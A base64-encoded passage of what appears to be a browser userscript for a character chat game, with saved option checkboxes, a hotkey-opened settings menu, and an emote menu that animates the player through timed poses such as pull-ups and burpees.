oZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIH0sIDUwMDApOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB9LCA1NTAwKTsKICAgICAgICBzZW5kRmRlYnVnKCk7CiAgICAKICAgICAgfQoKICAgIH0KICB9CiAgZnVuY3Rpb24gaGVsbG8oKXsKICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKCiAgfQogIC8vIExvYWQgdGhlIGNoZWNrYm94IHN0YXRlcyBmcm9tIGxvY2FsIHN0b3JhZ2UsIGlmIGF2YWlsYWJsZQogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMSIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDEuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24xIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24xLCAxMDAwKTsKICAgIH0KICB9CiAgCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24yIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94Mi5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjIiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjIsIDEwMDApOwogICAgfQogIH0KCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94My5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjMsIDEwMDApOwogICAgfQogIH0KICAKICAvLyBBZGQgZXZlbnQgbGlzdGVuZXJzIHRvIHRoZSBjaGVja2JveGVzIHRvIHNhdmUgdGhlaXIgc3RhdGUgaW4gbG9jYWwgc3RvcmFnZQogIGNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0pOwogIAogIGNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjIsIDEwMDApOwogICAgfQogIH0pOwoKICBjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9KTsKICAKCi8vT3B0aW9ucyBTdGF0ZXNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy8gU2F2ZSB0aGUgY2hlY2tib3ggc3RhdGVzIHRvIGxvY2FsIHN0b3JhZ2Ugd2hlbiB0aGV5IGNoYW5nZQpjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7Cn0pOwoKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKfSk7CgoKCi8vIEFkZCB0aGUgc2V0dGluZ3MgbWVudSB0byB0aGUgZG9jdW1lbnQKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwoKLy8gU2hvdyB0aGUgc2V0dGluZ3MgbWVudSB3aGVuIHRoZSB1c2VyIHByZXNzZXMgYCBhbmQgUyBhdCB0aGUgc2FtZSB0aW1lCmxldCBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgaXNTUHJlc3NlZCA9IGZhbHNlOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IHRydWU7CiAgfQoKICBpZiAoaXNCYWNrdGlja1ByZXNzZWQgJiYgaXNTUHJlc3NlZCkgewogICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH0KfSk7CgovLyBIaWRlIHRoZSBzZXR0aW5ncyBtZW51IHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9mZgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICBjb25zdCB0YXJnZXRFbGVtZW50ID0gZXZlbnQudGFyZ2V0OwogICAgY29uc3QgaXNTZXR0aW5nc01lbnUgPSAhIXRhcmdldEVsZW1lbnQuY2xvc2VzdCgiI3NldHRpbmdzLW1lbnUiKTsKICAgIAogICAgaWYgKCFpc1NldHRpbmdzTWVudSkgewogICAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0KICB9KTsKICAKICAKCiAgCgovLyBDbGVhciB0aGUgYCBhbmQgUyBmbGFncyB3aGVuIHRoZSB1c2VyIHJlbGVhc2VzIGVpdGhlciBrZXkKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgaXNCYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gInMiKSB7CiAgICBpc1NQcmVzc2VkID0gZmFsc2U7CiAgfQp9KTsKCgovL0VuZCBvZiBQZXJzaXN0YW50IE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgovL1N0YXJ0IG9mIEVtb3RlIE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgovLyBEZWZpbmUgYnV0dG9uIFVSTHMgYW5kIG5hbWVzCmNvbnN0IGJ1dHRvbkRhdGEgPSBbCiAgeyBuYW1lOiAiUHVsbC1VcHMiLCBhY3Rpb246ICgpID0+IHsKICAgICAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDIwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CgogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMzAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDI1MAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDQwMDApOyAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMTMwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNjAwMCk7ICAgIAp9IH0sCiAgeyBuYW1lOiAiQ2hlZXIiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsgfSB9LAogIHsgbmFtZTogIkp1bXBpbmcgSmFja3MiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICBIZWlnaHQ6IDE1MAogICAgICAgICAgfTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHVuZGVmaW5lZDsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgIH0gfSwKICB7IG5hbWU6ICJCdXJwZWVzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDUwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA2MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDgwMDApOyB9IH0sCiAgeyBuYW1lOiAiU2xlZXAiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllcyIsICJDbG9zZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkV5ZXMyIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRW1vdGljb24iLCAiU2xlZXAiKTsKICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOyAgfSB9Cl07CgovLyBDcmVhdGUgYnV0dG9uIGVsZW1lbnRzCmNvbnN0IGJ1dHRvbkNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpidXR0b25Db250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwpidXR0b25Db250YWluZXIuc3R5bGUud2lkdGggPSAiMzAwcHgiOwpidXR0b25Db250YWluZXIuc3R5bGUuaGVpZ2h0ID0gIjMwMHB4IjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmxlZnQgPSAiNTAlIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnRvcCA9ICI1MCUiOwpidXR0b25Db250YWluZXIuc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwpjb25zdCBidXR0b25DaXJjbGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKYnV0dG9uQ2lyY2xlLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLndpZHRoID0gIjIwMHB4IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmhlaWdodCA9ICIyMDBweCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5vcGFjaXR5ID0gIjEiOwpidXR0b25DaXJjbGUuc3R5bGUubGVmdCA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUudG9wID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgYmxhY2siOwoKYnV0dG9uQ29udGFpbmVyLmFwcGVuZENoaWxkKG